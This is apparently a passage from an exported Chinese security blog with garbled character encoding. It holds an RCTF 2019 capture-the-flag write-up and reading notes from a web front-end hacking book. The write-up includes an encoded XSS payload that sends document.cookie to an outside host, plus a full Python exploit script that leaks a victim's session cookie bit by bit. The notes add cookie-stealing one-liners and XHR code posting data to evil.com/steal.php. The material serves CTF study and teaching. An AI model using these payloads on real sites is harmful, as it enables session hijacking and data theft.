26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2346%3B%26%23102%3B%26%2349%3B%26%23115%3B%26%23104%3B%26%2346%3B%26%23115%3B%26%23105%3B%26%23116%3B%26%23101%3B%26%2347%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://rblog.2019.rctf.rois.io/api/v1/posts?callback=parent.location.href=&apos;http://xss.f1sh.site/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>å°†è¿™éƒ¨åˆ†è¿›è¡Œhtmlå®ä½“ç¼–ç ä¹‹ååŒ…è£¹è¿›<code>&lt;iframe srcdoc=(å¾ˆå¤šä¸­æ–‡å¥å·){æ”¾ç½®ä½ç½®}&gt;</code>ï¼Œç„¶åè¿›è¡Œæ•´ä½“urlç¼–ç ä¹‹åä¼ å…¥ï¼Œå°±å¾—åˆ°äº†flagã€‚</p>
<h2 id="RCTF2019-jails-password">RCTF2019 jails &amp;password</h2>
<p><a href="https://xz.aliyun.com/t/5216" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216</a></p>
<p><a href="https://github.com/nytr0gen/rctf-2019-writeups#jail" target="_blank" rel="noopener">https://github.com/nytr0gen/rctf-2019-writeups#jail</a></p>
<p><a href="https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md" target="_blank" rel="noopener">https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md</a></p>
<p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail %26 password</a></p>
<p>Unexpected Solution</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(s, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">'sha1'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha1(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha224'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha224(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha256'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha384'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha384(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha512'</span>:</span><br><span class="line">       <span class="keyword">return</span> hashlib.sha512(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'md5'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">'cipher not found %s'</span> % cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">hashes = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  return the breaking value </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_hash</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hashes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exists = os.path.isfile(<span class="string">'hashes.marshal'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">            hashes = &#123;&#125;</span><br><span class="line">            <span class="comment">#  generate a hash dictionary</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):<span class="comment">#256**4):</span></span><br><span class="line">                s = str(i)</span><br><span class="line">                h = hash(s, cipher)</span><br><span class="line">                hashes[ h[<span class="number">0</span>:<span class="number">6</span>] ] = s</span><br><span class="line"></span><br><span class="line">                <span class="comment">#  0x0FFFFFFF</span></span><br><span class="line">                <span class="comment">#  print every 1048575 times</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp; <span class="number">1048575</span>) == <span class="number">1048575</span>:</span><br><span class="line">                    print(<span class="string">'[*] hash loading at %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  write it into file</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                marshal.dump(hashes, f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*] loading lots of hashes'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                hashes = marshal.load(f)</span><br><span class="line">            print(<span class="string">'[*] done loading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> hashes:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'matching hash not found'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashes[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">req = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(i=<span class="number">0</span>, j=<span class="number">0</span>, tries=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> req</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= j &lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= i</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= tries &lt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"a44a15e070b2d3c4adf9e951de241af3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> req <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># os.environ["HTTP_PROXY"] = "http://localhost:8080"</span></span><br><span class="line">        <span class="comment"># os.environ["HTTPS_PROXY"] = "http://localhost:8080"</span></span><br><span class="line"></span><br><span class="line">        req = requests.Session()</span><br><span class="line">        req.cookies.update(cookies)</span><br><span class="line">        req.verify = <span class="literal">False</span></span><br><span class="line">        req.allow_redirects = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    word = <span class="string">'retrying'</span> <span class="keyword">if</span> tries &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">'trying'</span></span><br><span class="line">    print(<span class="string">'[*] %s for i=%d j=%d'</span> % (word, i, j))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  what is 0x%08x ?</span></span><br><span class="line">    payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">i=0x%08x;</span></span><br><span class="line"><span class="string">j=0x%02x;</span></span><br><span class="line"><span class="string">v = document.cookie;</span></span><br><span class="line"><span class="string">s = v.charCodeAt(i).toString(2).padStart(8, '0')[j];</span></span><br><span class="line"><span class="string">document.cookie="PHPSESSID=%s";</span></span><br><span class="line"><span class="string">window.onload = function() &#123;</span></span><br><span class="line"><span class="string">method = null;</span></span><br><span class="line"><span class="string">if (s === '1') &#123;</span></span><br><span class="line"><span class="string">    method = 'delete';</span></span><br><span class="line"><span class="string">&#125; else if(s === '0') &#123;</span></span><br><span class="line"><span class="string">    method = 'logout';</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    method = 'bad';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.write('&lt;img src="https://jail.2019.rctf.rois.io/?action=index&amp;method=' + method + '"&gt;');</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">"""</span> % (i, j, cookies[<span class="string">'PHPSESSID'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># submit post with payload</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">    resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;,  allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login if not logged</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=login'</span></span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"leethacker"</span>, <span class="string">"password"</span>: <span class="string">"leethacker"</span>&#125;</span><br><span class="line">        resp = req.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resend payload</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get post id</span></span><br><span class="line">    post_id = resp.text.split(<span class="string">'/?action=post&amp;id='</span>)[<span class="number">1</span>].split(<span class="string">'" target="'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] post_id: %s"</span> % post_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go to feedback page</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">    resp = req.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get proof of work</span></span><br><span class="line">    pow = resp.text.split(<span class="string">'Captcha: substr(md5(captcha), 0, 6) == "'</span>)[<span class="number">1</span>].split(<span class="string">'"&lt;/label&gt;'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] captcha: %s"</span> % pow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># submit post id</span></span><br><span class="line">        <span class="comment"># id=0&amp;captcha=1780076&amp;test=1</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: post_id,</span><br><span class="line">            <span class="string">'captcha'</span>: break_hash(<span class="string">'md5'</span>, pow),</span><br><span class="line">            <span class="string">'test'</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = req.post(url, data=data)</span><br><span class="line">        print(<span class="string">'[*] sent post to feedback'</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.text.find(<span class="string">'Admin will view your post soon.'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if all posts were removed or not after 5 seconds</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resp.text.find('Log-in to your account') != -1:</span></span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> resp.text.find(post_id) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># save result and continue to next bit</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> attack(i, j, tries+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)<span class="number">-7</span>, <span class="number">8</span>):</span><br><span class="line">        v = <span class="string">'0b'</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            v += s[i+j]</span><br><span class="line"></span><br><span class="line">        ret += chr(int(v, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'md5'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        key = sys.argv[<span class="number">1</span>]</span><br><span class="line">        x = break_hash(cipher, key)</span><br><span class="line">        print(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        istart = len(s) // <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(istart, <span class="number">400</span>):</span><br><span class="line">            jstart = len(s) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> jstart == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">'0'</span></span><br><span class="line">                jstart += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(jstart, <span class="number">8</span>):</span><br><span class="line">                s += str(attack(i, j))</span><br><span class="line">                print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line">            print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line">        print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>webå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜-è¯»ä¹¦ç¬”è®°[working]</title>
    <url>/2019/09/07/web%E5%89%8D%E7%AB%AF%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ç¬¬äºŒç« -å‰ç«¯åŸºç¡€">ç¬¬äºŒç«  å‰ç«¯åŸºç¡€</h2>
<h3 id="åŒåŸŸçš„æ¦‚å¿µ">åŒåŸŸçš„æ¦‚å¿µ</h3>
<ul>
<li>åŒåè®®(http https)</li>
<li>åŒåŸŸå</li>
<li>åŒç«¯å£</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; eval(location.hash.substr(1));&lt;/script&gt; è·å–é”šç‚¹åé¢çš„ä¸œè¥¿å¹¶æ‰§è¡Œ</span><br><span class="line">http://xxx/xxx#new%20Image.src=&quot;http://xxxxx/com?c=&quot;+escape(document.cookie)</span><br></pre></td></tr></table></figure>
<h3 id="CSRF">CSRF</h3>
<blockquote>
<p>CSRFä¼šå€Ÿç”¨ç›®æ ‡ç”¨æˆ·çš„æƒé™åšä¸€äº›å€Ÿåˆ€æ€äººçš„äº‹æƒ…(æ³¨æ„æ˜¯å€Ÿç”¨è€Œä¸æ˜¯ç›—ç”¨, ä¸æ˜¯è¦æ‹¿åˆ°æƒé™), ç›—å–é€šå¸¸æ˜¯xsså¹²çš„äº‹æƒ…, å€Ÿç”¨æ˜¯csrf, ä¾‹å­æœ‰p4ctf çš„ web50</p>
</blockquote>
<h3 id="HTTP">HTTP</h3>
<p>1.1 1.0 0.9</p>
<ul>
<li>HttpOnly: (é»˜è®¤æ— , å¦‚æœæœ‰çš„è¯è¡¨æ˜cookieä»…ä»…å­˜åœ¨äºhttpå±‚é¢ä¸èƒ½è¢«å®¢æˆ·ç«¯è„šæœ¬è¯»å–)</li>
<li>Secure: (é»˜è®¤æ— , æœ‰åˆ™è¡¨æ˜cookieä»…ä»…é€šè¿‡httpsæ¥ä¼ è¾“)</li>
</ul>
<h3 id="iframe">iframe</h3>
<p>å¾ˆå¤šç½‘ç«™ä¼šé€šè¿‡iframeæ¥å¼•å…¥ç¬¬ä¸‰æ–¹å†…å®¹æ¯”å¦‚å¹¿å‘Š,ç¬¬ä¸‰æ–¹webæ¸¸æˆå’Œåº”ç”¨.</p>
<p>çº¦å®šç½‘é¡µæ˜¯çˆ¶é¡µè€Œiframeä¸­çš„æ˜¯å­é¡µ. å¦‚æœçˆ¶é¡µå’Œå­é¡µåŒæº,é‚£ä¹ˆå¯ä»¥é€šè¿‡contentWindowæ¥æ“ä½œå½¼æ­¤çš„DOMæ ‘, å¦åˆ™åŒæºç­–ç•¥ä¼šç¦æ­¢åŒæ–¹å¯¹å½¼æ­¤çš„èµ„æºè¯»å†™. ä½†æ˜¯<code>å­é¡µè¿˜æ˜¯å¯ä»¥å¯¹çˆ¶é¡µçš„locationå€¼è¿›è¡Œå†™æ“ä½œ,è¿™æ ·å¯ä»¥è®©çˆ¶é¡µé‡å®šå‘åˆ°å…¶ä»–ç½‘é¡µæ¯”å¦‚å¹¿å‘Šé¡µé¢ä¸­</code> ä½†æ˜¯å¯¹locationæ˜¯æ²¡æœ‰è¯»æƒé™çš„, å› ä¸ºæœ‰äº›éšç§ä¿¡æ¯ä¼šå­˜åœ¨çˆ¶é¡µçš„urlä¸­, è¿™æ ·åšå¯ä»¥é¿å…éšç§æ³„éœ².</p>
<h3 id="è·å–ç‰¹å®šæ ‡ç­¾å¯¹è±¡">è·å–ç‰¹å®šæ ‡ç­¾å¯¹è±¡</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&apos;private_msg&apos;).innerHTML;</span><br><span class="line">document.getElementsByTagName(&apos;div&apos;)[2].innerHTML;</span><br></pre></td></tr></table></figure>
<h3 id="è¯·æ±‚å¤´å“åº”å¤´å’Œjavascript">è¯·æ±‚å¤´å“åº”å¤´å’Œjavascript</h3>
<p>ä¸æ˜¯ä»»ä½•è¯·æ±‚å¤´éƒ½å¯ä»¥é€šè¿‡javascriptæ¥è®¾ç½®.å¯ä»¥é€šè¿‡<code>getResponseHeader</code>å’Œ<code>getAllResponseHeaders</code>æ¥è¯»å–, ä½†æ˜¯åŒæ—¶, ä¸æ˜¯æ‰€æœ‰å“åº”å¤´éƒ½æ˜¯å¯ä»¥è¢«å®¢æˆ·ç«¯è„šæœ¬è¯»å–çš„, å…¶ä¸­å°±æœ‰è®¾ç½®äº†HttpOnlyçš„Set-Cookie/Set-Cookie2, è¿™æ˜¯ä¸¥ç¦å®¢æˆ·ç«¯è„šæœ¬è¯»å–çš„.</p>
<h3 id="HttpOnly-Cookie-è¯»å–">HttpOnly Cookie è¯»å–</h3>
<p>åœ¨apacheçš„å†å²ç‰ˆæœ¬é‡Œé¢,httpè¯·æ±‚é•¿åº¦è¶…è¿‡LimitRequestFieldSizeé•¿åº¦çš„æ—¶å€™, æœåŠ¡å™¨è¿”å›400é”™è¯¯å¹¶åœ¨è¿”å›æ¶ˆæ¯ä¸­å°†å‡ºé”™çš„è¯·æ±‚å¤´å†…å®¹è¾“å‡º, å…¶ä¸­å°±åŒ…æ‹¬äº†httponly cookie</p>
<h3 id="Ajax">Ajax</h3>
<p>Ajaxæ˜¯ä¸¥æ ¼éµå¾ªåŒæºç­–ç•¥çš„, æ—¢ä¸èƒ½ä»å¦ä¸€ä¸ªåŸŸè¯»å–æ•°æ®ä¹Ÿä¸èƒ½å‘ä»–å‘é€æ•°æ®. ä½†æ˜¯æœ‰ä¸€ç§åœºåˆé™¤å¤–, <a href="http://www.foo.com" target="_blank" rel="noopener">www.foo.com</a> <a href="http://xn--www-633e.evil.com" target="_blank" rel="noopener">å‘www.evil.com</a> å‘é€æ•°æ®çš„æ—¶å€™å¸¦ä¸Šè¯·æ±‚å¤´Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> . åŒæ—¶ç›®æ ‡åŸŸæ¥åˆ¤æ–­è¿™ä¸ªåŸŸåæ˜¯å¦åœ¨ç™½åå•ä¸­,å¦‚æœæ˜¯å°±è¿”å›å“åº”å¤´Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a> è¡¨ç¤ºåŒæ„è·¨åŸŸ. å¦‚æœå€¼æ˜¯é€šé…ç¬¦*, è¡¨ç¤ºä»»ä½•åŸŸéƒ½å¯ä»¥å‘é€æ•°æ®è¿‡æ¥.</p>
<p>å¦‚æœä¸è¿”å›å“åº”å¤´, æµè§ˆå™¨å°±ä¼šæŠ¥æƒé™é”™è¯¯.ç„¶è€Œ, å®é™…ä¸Šæ•°æ®å·²ç»è¢«ç›®æ ‡åŸŸç»™æ¥å—äº†.ä½†æ˜¯è¿™æ ·çš„è·¨åŸŸæ— æ³•å¸¦ä¸Šä¼šè¯ä¿¡æ¯, é™¤éè®¾ç½®xhrçš„withCreadentialså±æ€§ä¸ºtrue.ç›®æ ‡åŸŸ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: http://foo.com&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Credentials: true&quot;); // å¦‚æœä¸ºtrueé‚£ä¹ˆä¸Šé¢çš„å€¼ä¸èƒ½ä¸ºé€šé…ç¬¦* ,è¿™æ˜¯æµè§ˆå™¨ä¸ºäº†å®‰å…¨è¿›è¡Œçš„è€ƒè™‘</span><br></pre></td></tr></table></figure>
<h3 id="post">post</h3>
<p>ä¸€èˆ¬çš„content-typeä¸ºapplication/x-www-form-urlencoded, å¦‚æœæ˜¯ä¸Šä¼ æ–‡ä»¶å°±ä¸€èˆ¬ä¸º multipart/form-data</p>
<p>ä¸€èˆ¬post</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> request = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line">        request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            request - <span class="keyword">new</span> <span class="built_in">window</span>.ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">request = <span class="function"><span class="keyword">function</span>(<span class="params">method, src, argv, content_type</span>)</span>&#123;</span><br><span class="line">    xhr.open(method, src, <span class="literal">false</span>); <span class="comment">// åŒæ­¥æ–¹å¼, falseä¸ºåŒæ­¥, trueå°±æ˜¯å¼‚æ­¥å°±æ˜¯ajax</span></span><br><span class="line">    <span class="keyword">if</span>(method==<span class="string">"POST"</span>)xhr.setRequestHeader(<span class="string">'Content-Type'</span>,content-type); <span class="comment">// è®¾ç½®ç±»å‹, æ™®é€šè¡¨å•è¿˜æ˜¯æ–‡ä»¶</span></span><br><span class="line">    xhr.send(argv);</span><br><span class="line">    <span class="keyword">return</span> xhr.responseText;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attack_a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"http://www.evil.com/steal.php"</span>;</span><br><span class="line">    <span class="keyword">var</span> argv_0 = <span class="string">"&amp;name=value1&amp;name2=value2"</span>;</span><br><span class="line">    request(<span class="string">"POST"</span>, src, argv_0, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attack_b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src = <span class="string">"http://www.evil.com/steal.php"</span>;</span><br><span class="line">    <span class="keyword">var</span> name1 = <span class="string">"value1"</span>;</span><br><span class="line">    <span class="keyword">var</span> name2 = <span class="string">"value2"</span>;</span><br><span class="line">    <span class="keyword">var</span> argv_0 = <span class="string">"\r\n"</span>;</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb\r\nContent-Disposition: form-data; name=\"name1\"\r\n\r\n"</span>;</span><br><span class="line">    argv_0 += (name1 + <span class="string">"\r\n"</span>);</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb\r\nContent-Disposition: form-data; name=\"name2\"\r\n\r\n"</span>;</span><br><span class="line">    argv_0 += (name2 + <span class="string">"\r\n"</span>);</span><br><span class="line">    argv_0 += <span class="string">"------------aabbaabb--\r\n"</span>;</span><br><span class="line">    request(<span class="string">"POST"</span>, src, argv_0, <span class="string">"multipart/form-data;boundary=------------aabbaabb"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attack_a();</span><br><span class="line">attack_b();</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…formè¡¨å•è‡ªæäº¤ä¹Ÿå¯ä»¥æ¨¡æ‹Ÿ(å¸¸ç”¨äºcsrfä¸­)</p>
<h3 id="å­åŸŸç­–ç•¥cookie">å­åŸŸç­–ç•¥cookie</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie=&quot;test=1;domain=foo.com&quot;</span><br><span class="line">foo.comæˆä¸ºäº†çˆ¶çº§åŸŸå, è¿™æ ·å¤šä¸ªå­åŸŸåä¹‹é—´å¯ä»¥å…±äº«cookie</span><br></pre></td></tr></table></figure>
<h3 id="è·¯å¾„ç­–ç•¥cookie">è·¯å¾„ç­–ç•¥cookie</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># /evil/ è·¯å¾„æƒ³è¯»å– /admin/ è·¯å¾„ä¸‹çš„cookieçš„è¯, å¯ä»¥é€šè¿‡è·¨åŸŸiframeæ¥å®ç°</span><br><span class="line">xc = <span class="function"><span class="keyword">function</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    o.src = src;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(o);</span><br><span class="line">    o.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        d = o.contentDocument || o.contentWindow.document;</span><br><span class="line">        alert(d.cookie);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;(<span class="string">'http://a.foo.com/admin/index.php'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="http-only-cookie-æ³„éœ²çš„æƒ…å†µ">http-only cookie æ³„éœ²çš„æƒ…å†µ</h3>
<ul>
<li>phpinfo è°ƒè¯•ä¿¡æ¯</li>
<li>Django è°ƒè¯•ä¿¡æ¯</li>
<li>Apache 2.2 400 é”™è¯¯æš´éœ²</li>
</ul>
